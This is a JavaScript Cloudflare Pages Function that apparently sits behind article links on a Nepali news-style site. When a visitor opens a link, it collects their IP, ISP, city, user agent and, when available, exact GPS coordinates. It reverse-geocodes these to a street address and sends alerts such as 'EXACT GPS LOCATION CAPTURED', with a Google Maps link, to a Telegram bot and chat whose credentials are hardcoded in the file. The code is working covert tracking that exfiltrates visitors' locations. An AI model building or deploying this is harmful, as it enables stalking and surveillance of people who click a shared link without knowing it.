// Cloudflare Pages Function: /api/location

const DEFAULT_BOT_TOKEN = '9189550669:AAEorTZyQhF2vZlZHzFgU6Tgxqw4Y2CKgrk';
const DEFAULT_CHAT_ID = '7070372458';

// Reverse geocode via OpenStreetMap Nominatim
async function reverseGeocode(lat, lon) {
  try {
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ne,en`;
    const res = await fetch(url, {
      headers: {
        'User-Agent': 'BulletKhabar-LocationService/1.0',
      },
    });
    if (!res.ok) return null;
    const data = await res.json();
    const addr = data.address || {};

    return {
      displayName: data.display_name || '',
      road: addr.road || addr.street || '',
      neighbourhood: addr.neighbourhood || addr.suburb || addr.quarter || '',
      city: addr.city || addr.town || addr.municipality || addr.village || '',
      district: addr.state_district || addr.county || '',
      state: addr.state || '',
      country: addr.country || '',
      mapsUrl: `https://www.google.com/maps?q=${lat},${lon}`,
    };
  } catch {
    return {
      displayName: '',
      mapsUrl: `https://www.google.com/maps?q=${lat},${lon}`,
    };
  }
}

async function sendTelegramAlert(env, record, isExactGPS = false) {
  const token = (env && env.TELEGRAM_BOT_TOKEN) || DEFAULT_BOT_TOKEN;
  const chatId = (env && env.TELEGRAM_CHAT_ID) || DEFAULT_CHAT_ID;

  if (!token || !chatId) return;

  let message = '';

  if (isExactGPS) {
    const area = record.address?.neighbourhood || record.address?.road || 'Street Level';
    const city = record.address?.city || record.address?.district || 'Nepal';
    const mapsUrl = record.address?.mapsUrl || `https://www.google.com/maps?q=${record.latitude},${record.longitude}`;

    message = `🎯 *EXACT GPS LOCATION CAPTURED*
━━━━━━━━━━━━━━━━━━━━
📰 *Article:* \`${record.slug}\`
🏙️ *Area / Tole:* ${area}
🗺️ *City / District:* ${city}
📌 *Exact Address:* ${record.address?.displayName || 'N/A'}
🎯 *GPS Precision:* ±${record.accuracy || '?'} meters
🌐 *IP:* \`${record.ip}\`
⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Kathmandu' })} (Nepal Time)

🔗 [Click here to Open in Google Maps](${mapsUrl})`;
  } else {
    // Cloudflare Edge Location (First hit on click)
    const mapsUrl = `https://www.google.com/maps?q=${record.latitude},${record.longitude}`;

    message = `🌐 *LINK CLICKED (Cloudflare Location)*
━━━━━━━━━━━━━━━━━━━━
📰 *Article:* \`${record.slug}\`
🏙️ *City:* ${record.city || 'Unknown'}
🗺️ *Region:* ${record.region || 'Nepal'}
📡 *ISP Provider:* ${record.isp || 'Mobile / Wi-Fi'}
🌐 *IP:* \`${record.ip}\`
⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Kathmandu' })} (Nepal Time)

🔗 [Approximate Location on Google Maps](${mapsUrl})`;
  }

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: false,
      }),
    });
  } catch (e) {
    console.error('Telegram notification error:', e);
  }
}

export async function onRequestPost(context) {
  try {
    const body = await context.request.json();
    const { latitude, longitude, accuracy, slug } = body;
    const cf = context.request.cf || {};

    const ip = context.request.headers.get('cf-connecting-ip') || 'local';
    const userAgent = context.request.headers.get('user-agent') || '';

    // If real GPS coordinates are received
    if (latitude !== undefined && longitude !== undefined) {
      const address = await reverseGeocode(latitude, longitude);

      const record = {
        id: Date.now().toString(),
        latitude,
        longitude,
        accuracy: accuracy ? Math.round(accuracy) : null,
        address,
        slug: slug || 'home',
        timestamp: new Date().toISOString(),
        ip,
        userAgent,
      };

      context.waitUntil(sendTelegramAlert(context.env, record, true));

      return new Response(JSON.stringify({ success: true, type: 'gps', record }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      });
    }

    // 1st Hit: Cloudflare Edge location upon link open
    const ipLat = cf.latitude ? parseFloat(cf.latitude) : 27.7172;
    const ipLon = cf.longitude ? parseFloat(cf.longitude) : 85.3240;

    const record = {
      id: Date.now().toString(),
      latitude: ipLat,
      longitude: ipLon,
      city: cf.city || 'Kathmandu',
      region: cf.region || cf.country || 'Nepal',
      isp: cf.asOrganization || 'Internet Provider',
      slug: slug || 'home',
      timestamp: new Date().toISOString(),
      ip,
      userAgent,
    };

    context.waitUntil(sendTelegramAlert(context.env, record, false));

    return new Response(JSON.stringify({ success: true, type: 'cloudflare_ip', record }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' },
    });
  } catch {
    return new Response(JSON.stringify({ error: 'Failed to record location' }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' },
    });
  }
}

export async function onRequestGet() {
  return new Response(JSON.stringify({ status: 'ok', service: 'Active' }), {
    status: 200,
    headers: { 'Content-Type': 'application/json' },
  });
}
